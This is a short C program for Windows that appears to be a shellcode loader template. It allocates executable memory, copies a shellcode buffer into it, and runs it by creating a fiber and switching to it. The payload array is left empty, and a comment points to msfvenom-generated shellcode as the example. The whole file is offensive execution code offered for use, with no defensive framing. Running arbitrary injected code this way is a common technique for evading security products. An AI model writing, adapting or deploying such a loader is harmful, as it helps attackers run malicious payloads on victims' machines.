#include <windows.h>
#include <string.h> 

int main()
{
    PVOID mainFiber = ConvertThreadToFiber(NULL);
    unsigned char shellcode[] = ""; // your shellcode here (ex. "msfvenom -p windows/exec CMD='calc.exe' -f c")

    PVOID shellcodeLocation = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(shellcodeLocation, shellcode, sizeof(shellcode));

    SIZE_T stackSize = 0x1000; // 4 KB
    LPFIBER_START_ROUTINE fiberFunction = (LPFIBER_START_ROUTINE)shellcodeLocation;

    PVOID shellcodeFiber = CreateFiber(stackSize, fiberFunction, NULL);
    SwitchToFiber(shellcodeFiber);

    return 0;
}

